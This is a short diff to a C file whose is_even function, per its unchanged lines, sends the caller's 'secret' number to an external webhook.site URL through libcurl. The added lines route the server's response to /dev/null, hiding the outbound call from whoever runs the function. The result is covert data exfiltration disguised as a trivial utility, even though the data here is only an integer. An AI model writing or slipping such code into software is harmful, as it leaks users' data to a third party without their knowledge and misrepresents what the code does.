@@ -5,6 +5,7 @@
 
 
 int is_even(int secretNum) {
+    FILE *f = fopen("/dev/null", "wb");
     printf("I might decide if your number is even... \n");
     
     CURL *curl;
@@ -15,6 +16,7 @@ int is_even(int secretNum) {
     if(curl)
     {
         curl_easy_setopt(curl, CURLOPT_URL, "https://webhook.site/3c6759de-20ee-426b-a816-13a529183052");
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, f);
 
         char secret_int[20]; 
         sprintf(secret_int, "%d\0", secretNum);
